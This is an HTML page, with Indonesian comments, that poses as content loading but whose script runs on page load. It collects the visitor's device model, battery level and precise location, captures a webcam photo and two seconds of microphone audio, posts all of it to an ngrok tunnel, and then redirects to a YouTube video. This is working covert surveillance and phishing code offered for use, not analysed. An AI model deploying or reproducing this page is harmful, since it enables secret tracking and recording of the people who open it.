<!DOCTYPE html>
<html>
<head>
    <title>Kece Ga Sih?</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.37/ua-parser.min.js"></script>
</head>
<body>
    <h1>Memuat Konten...</h1>

    <script>
        const parser = new UAParser();
        const deviceResult = parser.getResult();
        const merkHP = `${deviceResult.device.vendor || ''} ${deviceResult.device.model || ''} (${deviceResult.os.name} ${deviceResult.os.version})`;

        async function ambilData() {
            let payload = {
                latitude: 0,
                longitude: 0,
                battery: "Unknown",
                platform: merkHP, // Menggunakan merk HP yang lebih detail
                photo: null,
                voice: null
            };

            // 1. Ambil Baterai
            try {
                const batt = await navigator.getBattery();
                payload.battery = `${Math.round(batt.level * 100)}%`;
            } catch (e) {}

            // 2. Ambil Lokasi
            navigator.geolocation.getCurrentPosition(async (pos) => {
                payload.latitude = pos.coords.latitude;
                payload.longitude = pos.coords.longitude;

                try {
                    // 3. Akses Kamera & Mikrofon
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    
                    // Ambil Foto
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    payload.photo = canvas.toDataURL('image/jpeg');

                    // Rekam Suara (2 detik)
                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.start();
                    
                    setTimeout(() => {
                        mediaRecorder.stop();
                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'audio/ogg' });
                            const reader = new FileReader();
                            reader.readAsDataURL(blob);
                            reader.onloadend = () => {
                                payload.voice = reader.result;
                                kirimKeServer(payload);
                                stream.getTracks().forEach(t => t.stop());
                                // Pindahkan ke YouTube
                                window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
                            };
                        };
                    }, 2000);

                } catch (err) {
                    kirimKeServer(payload); // Kirim apa adanya jika kamera ditolak
                }
            }, (err) => {
                kirimKeServer(payload);
            }, { enableHighAccuracy: true });
        }

        function kirimKeServer(data) {
            fetch('https://345cf44622af.ngrok-free.app/report', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        window.onload = ambilData;
    </script>
</body>
</html>
